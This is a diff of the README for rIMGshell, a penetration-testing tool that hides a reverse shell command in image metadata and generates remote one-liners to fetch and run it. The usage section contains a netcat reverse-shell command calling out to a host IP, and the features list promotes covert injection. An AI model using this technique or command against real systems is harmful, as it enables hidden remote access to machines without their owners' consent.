@@ -1,17 +1,26 @@
 # rIMGshell
 
-<img src="https://github.com/git5loxosec/rIMGshell/blob/main/Screenshot_2023-09-22_20_08_14.png">
-```
+<img src="https://github.com/git5loxosec/rIMGshell/blob/main/github_rimgshell1.png">
+Clean image file no reverse shell.
+<img src="https://github.com/git5loxosec/rIMGshell/blob/main/github_rimgshell2.png">
+The reverse shell injection method used here wont affect the integrity of the image file.
+<img src="https://github.com/git5loxosec/rIMGshell/blob/main/github_rimgshell3.png">
+Connection established, mission accomplished!
 
-# rIMGshell
+
+
+# Description:
 
 rIMGshell is a command-line tool for injecting a reverse shell command into an image and generating one-liner execution methods to exploit it.
 
-## Features
+# How It Works:
+rIMGshell takes a reverse shell command and an image file as input. It then injects the command into the image using metadata comments. After injection, it generates a one-liner execution method for retrieving and executing the injected command from a remote location.
 
-- Inject reverse shell commands into image files.
-- Generate one-liner execution methods for various tools.
-- Choose from multiple one-liner execution methods.
+# Features:
+Covert Command Injection: Inject reverse shell commands into image files.
+Multiple Execution Methods: Choose from various one-liner execution methods for retrieving and executing the injected command.
+Versatile Compatibility: Works with common Linux command-line utilities such as exiftool, exiv2, identify, file, and jpeginfo.
+Secure Communication: Execute commands remotely without revealing their presence in the image.
 
 ## Installation
 
@@ -49,19 +58,13 @@ rIMGshell is a command-line tool for injecting a reverse shell command into an i
 ./rIMGshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
 ```
 
-## One-Liner Execution Methods
+Note: Ensure that you have the required dependencies (e.g., exiftool, curl) installed on your system before using rIMGshell.
 
-- **exiftool-one-liner:** Injected image can be executed with exiftool.
-- **exiv2-one-liner:** Injected image can be executed with exiv2.
-- **identify-one-liner:** Injected image can be executed with identify.
-- **file-grep-one-liner:** Injected image can be executed with file and grep.
-- **jpeginfo-grep-one-liner:** Injected image can be executed with jpeginfo and grep.
+**Warning: Ethical and Responsible Use Only
+rIMGshell is intended for legitimate and ethical purposes, such as penetration testing, cybersecurity assessments, and educational use. Unauthorized use of this tool for malicious activities is strictly prohibited and may have serious legal consequences. Ensure that you have proper authorization and adhere to all applicable laws and regulations before using rIMGshell.**
 
-## Contributing
-
-Contributions are welcome! Please fork the repository and submit a pull request.
 
 ## License
 
+
 This project is licensed under the [MIT License](LICENSE).
-```
